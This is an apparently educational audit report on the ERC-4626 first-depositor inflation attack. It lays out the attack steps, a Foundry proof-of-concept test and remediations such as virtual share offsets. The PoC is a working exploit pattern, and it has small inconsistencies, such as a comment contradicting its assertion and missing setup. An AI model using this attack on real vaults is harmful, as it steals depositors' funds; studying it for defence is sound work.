# Report 006: ERC-4626 First-Depositor Inflation Attack

| Field | Value |
| --- | --- |
| **Type** | Educational case study |
| **Status** | Complete |
| **Date** | 2026-09-15 |
| **Language** | Solidity `^0.8.24` |
| **Severity** | Medium — High for empty or dust-balance vaults (see [severity matrix](./templates/severity-matrix.md)) |
| **Repository** | Educational fixture, pattern from [evm-audit-lab](https://github.com/DefiAudit0x/evm-audit-lab) |

---

## 1. Summary

A naively implemented ERC-4626 vault prices shares as `assets × totalSupply / totalAssets` and floors the result. The first depositor can exploit that rounding at zero supply: deposit 1 wei for 1 share, inflate `totalAssets` with a direct token transfer, and cause subsequent depositors to receive zero shares — their assets are then absorbed by the attacker's single share. Educational case study on a fixture vault.

## 2. Background

Share pricing in the fixture:

```solidity
// NaiveVault.sol, L31-L35
function convertToShares(uint256 assets) public view returns (uint256) {
    if (totalSupply() == 0) return assets;
    return (assets * totalSupply()) / totalAssets();   // floors — rounds against depositor
}
```

Direct donations are possible because the vault holds the underlying token and `totalAssets()` reads its balance, so a plain `transfer` to the vault changes share pricing without minting shares.

## 3. Threat model

- **Asset at risk:** depositors' assets — from dust up to a full deposit, depending on where the rounding lands.
- **Privileged actors:** none needed for the attack.
- **Untrusted actors:** any first (or early) depositor.
- **Preconditions:** share supply at zero or dust; the attacker must act before the first honest deposit — i.e., at launch, or after a full withdrawal that returns supply to zero.

## 4. Violated invariant

> A depositor's shares must be proportional to their contribution to vault assets, within a rounding error bounded independently of existing share supply.

With 1 wei of supply, the rounding error is bounded only by how much the attacker donates — the bound degenerates, and the invariant fails.

## 5. Impact

Worked example. The attacker deposits 1 wei and receives 1 share, then transfers `100_000e18` tokens directly to the vault. A victim now deposits `100_000e18`:

```text
shares = 100_000e18 * 1 / (100_000e18 + 1) = 0        // floored to zero
```

The victim receives 0 shares, and the attacker redeems the single share for essentially the whole vault. The same mechanics produce partial losses at slightly larger supply, and pure griefing variants (attacker spends capital to make the vault unusable for small depositors).

Argued in both directions: in a mature vault with meaningful supply, the identical attack shifts a victim's rounding by fractions of a wei — impact collapses to Informational. The severity is therefore conditional: **High** whenever the vault can be at (or near) zero supply — launch and post-full-withdrawal states — and Low–Informational otherwise. Balanced rating for this report: **Medium**.

## 6. Technical details

The root cause is twofold: (a) share conversion floors in the depositor's disfavor precisely when supply is smallest, and (b) `totalAssets()` is sensitive to direct transfers. The attack needs only one step more than an honest deposit:

```text
1. vault.deposit(1 wei)                  -> 1 share (totalSupply == 0 path)
2. token.transfer(vault, 100_000e18)     -> totalAssets inflated, supply unchanged
3. victim deposits 100_000e18            -> 0 shares (or rounding dust)
4. attacker redeems 1 share              -> absorbs the deposited assets
```

## 7. Proof of Concept

```solidity
// test/InflationAttack.t.sol (educational sketch)
function testFirstDepositorAbsorbsVictimDeposit() public {
    vm.prank(attacker);
    vault.deposit(1 wei);
    assertEq(vault.balanceOf(attacker), 1);

    underlying.transfer(address(vault), 100_000e18);    // donation

    vm.prank(victim);
    vault.deposit(100_000e18);
    assertEq(vault.balanceOf(victim), 0);               // must not be zero

    vm.prank(attacker);
    vault.redeem(1);
    assertGt(underlying.balanceOf(attacker), 100_000e18);
}
```

Run with:

```bash
forge test --match-test testFirstDepositorAbsorbsVictimDeposit -vv
```

## 8. Remediation

Pick one structural mitigation and keep it for the vault's lifetime:

1. **Virtual shares/assets offset** (the OpenZeppelin pattern): add a virtual constant to both `totalSupply()` and `totalAssets()` inside the share math, so real supply never operates in the degenerate 1-share regime.
2. **Dead shares:** mint an irredeemable dust of shares at deployment.
3. **Minimum-shares guard:** revert when a deposit would round to fewer than a configurable minimum of shares (accepting that sub-minimum deposits become unusable).

The narrowest robust fix is the offset pattern. A launch-time seed deposit owned by the protocol reduces the window but does not close it, because a full withdrawal can return supply to zero.

## 9. Regression test

```solidity
function testVictimSharesSurviveOffset() public {
    // Same steps as the PoC, against the virtual-offset vault:
    uint256 victimShares = vault.balanceOf(victim);
    uint256 expected = 100_000e18 * vault.totalSupply() / vault.totalAssets();
    assertApproxEqRel(victimShares, expected, 1e15);   // within 0.1% of proportional
}
```

## 10. References

- EIP-4626 — Security Considerations: inflation / first-depositor attack.
- OpenZeppelin ERC-4626 documentation — virtual shares and the decimals-offset mitigation.
- Euler Finance incident post-mortem (March 2023) — donation-based share-price manipulation.
